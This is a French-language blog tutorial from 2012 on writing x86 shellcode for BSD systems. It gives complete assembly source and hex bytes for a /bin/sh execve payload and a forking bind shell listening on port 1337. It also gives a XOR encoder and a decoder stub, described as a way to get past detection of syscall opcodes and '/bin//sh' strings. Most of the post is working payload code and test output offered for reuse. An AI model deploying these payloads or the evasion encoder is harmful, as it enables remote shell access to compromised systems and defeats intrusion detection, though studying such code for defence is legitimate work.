---
title: BSD Shellcoding
date: 2012-01-28
tags: shellcoding,bsd
author: Tosh
layout: post
---

### BSD Shellcoding !

Dans cet article, j'expliquerais comment créer des shellcodes sur les systèmes *BSD, pour les architectures x86. Je détaillerais surtout le fonctionnement des syscall et comment les utiliser, car c'est à peu prêt la seule chose qui diffère comparé à un système Linux.

Les outils que j'utilise sont : nasm, ld, objdump et shelltest, un programme de ma conception, permettant l'automatisation de la création de shellcodes.
Les appels systèmes

Bien, donc comme je le disais, les appels systèmes sont légèrement différents sous BSD, car les paramètres sont envoyés sur la stack, et non dans les registres.

Les numéros des appels systèmes se trouvent dans /usr/src/sys/kern/syscalls.master. Le numéro est à mettre dans eax, et les paramètres sur la pile, dans l'ordre inverse de leurs déclaration.

Il faut aussi rajouter un padding de 4 octets, qui est destiné généralement à EIP.

Par exemple, voici comment afficher un caractère à l'écran :

```nasm
    section .text
    global _start

    _start:
    xor eax, eax          ; mise à 0 du registre eax
    push 'AAAA'           ; On met le caractère à afficher sur la pile
    mov ebx, esp          ; adresse du caractère à afficher
    mov al, 1             ; On empile la taille
    push eax
    push ebx              ; On empile le buffer
    push eax              ; On empile 1 (STDOUT)
    push eax              ; PADDING
    mov al, 4             ; syscall sys_write
    int 0x80              ; appel système

    mov al, 1             ; exit
    int 0x80
```

Testons :

```
	[tosh@localhost /usr/home/tosh]$ nasm -f elf test.s && shelltest test.o
	Len : 23 bytes
	Shellcode : \x31\xc0\x68\x41\x41\x41\x41\x89\xe3\xb0\x01\x50\x53\x50\x50
                \xb0\x04\xcd\x80\xb0\x01\xcd\x80
	[tosh@localhost /usr/home/tosh]$
```

Pas trop mal, non ?

#### Exécuter un shell ####

Afficher un caractère c'est bien, mais exécuter un shell serait mieux, non?

D'après le fichier syscalls.master, le syscall execve est le 59. Il prend trois arguments, le nom du fichier à exécuter (/bin/sh), les arguments du programme et l'environnement. Le dernier sera mit à NULL.

Voici ce que ça donne :

```nasm
	section .text
    global _start
	start:
	xor eax, eax
    push eax          ; nul byte
    push '//sh'
    push '/bin'       ; On stock la chaine sur la pile

    mov ebx, esp      ; Pointeur sur '/bin//sh'
    push eax          ; argv[1] = NULL
    push ebx          ; argv[0] = '/bin//sh'
    mov ecx, esp      ; ecx = argv
    push eax          ; Empile env (NULL)
    push ecx          ; Empile argv
    push ebx          ; Empile '/bin//sh'
    mov al, 59        ; Appel system execve()
    push eax          ; PADDING
    int 0x80
```

Bon bien sûr ici je m'embête à remplir argv, ce qui n'est à priori pas nécessaire.

Testons :

```
    [tosh@localhost /usr/home/tosh]$ nasm -f elf test.s && shelltest test.o
    Len : 27 bytes
    Shellcode : \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
                \x50\x53\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd\x80
    $
```

Parfait, nous avons notre shell !


#### Shellcodes & sockets ####

Bien, voyons un peu comment fonctionnent les appels systèmes liés aux sockets maintenant, en vue de faire par exemple un bindshell.

En regardant un peu dans syscalls.master, on remarque que presque toutes les primitives C tel que connect(), accept(), listen(), trouvent leurs équivalents dans les appels systèmes.

C'est je trouve plus simple que sur Linux, où il n'y a qu'un seul appel à socket, et dont le fonctionnement dépends du paramètre qu'on lui donne.

On retrouve ici une correspondance C -> assembleur, ce qui facilite la tâche.

Bien, pour un bindport, il faut donc effectuer les appels systèmes suivants : socket, bind, listen, accept, dup2, execve.

On peut aussi éventuellement faire un fork après le accept, pour accepter plusieurs connexions à la fois, et éviter que le shellcode se termine lorsque l'on quitte le shell.

Allons-y !

J'ai commenté au maximum le code, pour l'expliquer :

```nasm
	section .text
	global _start
	_start:
	xor eax, eax
	push eax          ; protocol
	inc eax
	push eax          ; SOCK_STREAM
	inc eax
	push eax          ; AF_INET
	push eax          ; PADDING
	mov al, 97        ; socket(AF_INET, SOCK_STREAM, 0)
	int 0x80

	mov esi, eax      ; Sauvegarde du fd socket dans esi

	xor eax, eax      ; Construction d'une sockaddr
	push eax
	push word 0x3905  ; Port 1337
	push word 0x0201
	mov ecx, esp      ; Pointeur sur sockaddr

	push byte 16      ; sizeof(sockaddr)
	push ecx          ; sockaddr*
	push esi          ; sock
	push eax          ; PADDING
	mov al, 104       ; bind(sock, sockaddr*, sizeof(sockaddr))
	int 0x80

	xor eax, eax
	mov al, 5
	push eax
	push esi
	push eax
	mov al, 106       ; listen(sock, 5)
	int 0x80

	.ACCEPT:
	xor eax, eax
	push eax
	push eax
	push esi
	push eax
	mov al, 30        ; accept(sock, 0, 0)
	int 0x80

	mov edi, eax

	xor eax, eax
	push eax
	mov al, 2         ; fork()
	int 0x80

	or eax, eax       ; le processus fils retourne sur le accept()
	jz .ACCEPT

	xor ecx, ecx      ; dup2 STDERR, STDIN, STDOUT
	.L:
	push ecx
	push edi
	xor eax, eax
	mov al, 90        ; dup2(sock, ecx)
	push eax
	int 0x80
	inc cl
	cmp cl, 3
	jne .L

	xor eax, eax
	push eax          ; nul byte
	push '//sh'
	push '/bin'       ; On stock la chaine sur la pile

	mov ebx, esp      ; Pointeur sur '/bin//sh'
	push eax          ; argv[1] = NULL
	push ebx          ; argv[0] = '/bin//sh'
	mov ecx, esp      ; ecx = argv
	push eax          ; Empile env (NULL)
	push ecx          ; Empile argv
	push ebx          ; Empile '/bin//sh'
	mov al, 59        ; Appel system execve()
	push eax          ; PADDING
	int 0x80

	jmp .ACCEPT       ; On retourne sur le accept()
```

Testons :

```
	[tosh@localhost /usr/home/tosh]$ shelltest test
	Len : 120 bytes
	Shellcode : \x31\xc0\x50\x40\x50\x40\x50\x50\xb0\x61\xcd\x80\x89\xc6\x31
                \xc0\x50\x66\x68\x05\x39\x66\x68\x01\x02\x89\xe1\x6a\x10\x51
                \x56\x50\xb0\x68\xcd\x80\x31\xc0\xb0\x05\x50\x56\x50\xb0\x6a
                \xcd\x80\x31\xc0\x50\x50\x56\x50\xb0\x1e\xcd\x80\x89\xc7\x31
                \xc0\x50\xb0\x02\xcd\x80\x09\xc0\x74\xe9\x31\xc9\x51\x57\x31
                \xc0\xb0\x5a\x50\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf0\x31\xc0
                \x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53
                \x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd\x80\xe9\xb7\xff\xff\xff
```

Nous pouvons maintenant nous connecter sur le port 1337 avec ncat, et quitter le shell ne termine pas le shellcode.

Bon, bien sûr, la taille peut être optimisé ici. De plus, ici ce n'est pas super propre, car si y'a de nombreuses connexions sur le shellcode, il finira par planter, étant donné que je ne nettoie pas la pile à chaque appel à execve. Mais bon, pour un shellcode ça ira bien comme ça...
Encoder un shellcode

Bien, je vais maintenant montrer comment encoder simplement un shellcode, en vue de passer certaines protections, comme par exemple la reconnaissance des opcodes "\xcd\x80" (appel système) ou "/bin//sh".

Le plus simple à implémenter, est un cryptage XOR, avec une clef d'un octet.

Le shellcode devra être décodé par une routine, avant d'être exécuté. Il aura donc cette forme :

```
	[ Decoder   ]
	[ Shellcode ]
```

Pour le decoder, le plus dur va être de déterminer l'adresse exacte du shellcode, car il n'y a aucuns moyens de le déterminer à l'avance. Pour se faire, nous utiliserons les instructions jmp shellcode, call decoder, pop. Il faudra aussi qu'il sache où le shellcode se termine, j'utiliserais un octet 0x90 que je mettrais à la fin du shellcode pour savoir quand s'arrêter.

Bien, commençons par prendre un shellcode, et le crypter avec une clef quelquonque (Il ne faut pas qu'il y ai de 0x90 ni de 0x00 dans les opcodes). On va reprendre le shellcode exécutant un shell, il ira très bien.

Voici le programme que j'ai utilisé pour le crypter avec la clef 0xcc :

```c
	#include <stdio.h>

	int main(void)
	{
    	char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
	    "\x50\x53\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd\x80";
	    int i;

	    for(i = 0; i < sizeof(shellcode)-1; i++)
	    {
	        printf(",0x%.2x", (unsigned char)shellcode[i] ^ 0xcc);
	    }
	    printf("\n");
	    return 0;
	}
```

Ce qui nous donne :

```
	,0xfd,0x0c,0x9c,0xa4,0xe3,0xe3,0xbf,0xa4,0xa4,0xe3,0xae,0xa5,0xa2,0x45,0x2f,0x9c,0x9f,
    0x45,0x2d,0x9c,0x9d,0x9f,0x7c,0xf7,0x9c,0x01,0x4c
```

Codons maintenant le decoder :

```nasm
	section .text
	global _start

	_start:
	jmp short CALL          ; On saute sur le CALL
	RET:
	pop esi                 ; On met dans esi l'adresse du shellcode
	LOOP:
	cmp byte[esi], 0x90     ; Est-on arrivé à la fin ?
	je SHELLCODE            ; Si oui, le shellcode est decrypté, on peut jmp dessus
	xor byte[esi], 0xcc     ; Sinon, on décrypte l'octet courant avec la clef 0xcc
	inc esi
	jmp LOOP

	CALL:
	call RET                ; call empile la prochaine instruction, ici notre shellcode
	SHELLCODE:                 ; Notre shellcode crypté
	db 0xfd,0x0c,0x9c,0xa4,0xe3,0xe3,0xbf,0xa4,0xa4,0xe3,0xae,0xa5
	db 0xa2,0x45,0x2f,0x9c,0x9f,0x45,0x2d,0x9c,0x9d,0x9f,0x7c,0xf7,0x9c,0x01,0x4c
	db 0x90
```

Testons le :

```
	[tosh@localhost /usr/home/tosh]$ shelltest test
	Len : 50 bytes
	Shellcode : \xeb\x0f\x5e\x80\x3e\x90\x74\x0e\x80\x36\xcc\x46\xe9\xf2\xff\xff\xff
                \xe8\xec\xff\xff\xff\xfd\x0c\x9c\xa4\xe3\xe3\xbf\xa4\xa4\xe3\xae\xa5
                \xa2\x45\x2f\x9c\x9f\x45\x2d\x9c\x9d\x9f\x7c\xf7\x9c\x01\x4c\x90
	$
```

Parfait, nous avons encore notre shell !

Bien sûr, pour que celà fonctionne, il faut que la zone où est injecté le shellcode soit +rwx, ce qui devient rare de nos jours...

Voilà, je vais m'arrêter là, peut être que j'étofferais cet article avec le temps, le monde du shellcoding est tellement vaste et intéressant, qu'il y a encore de nombreuses choses à dire.

Good programming !
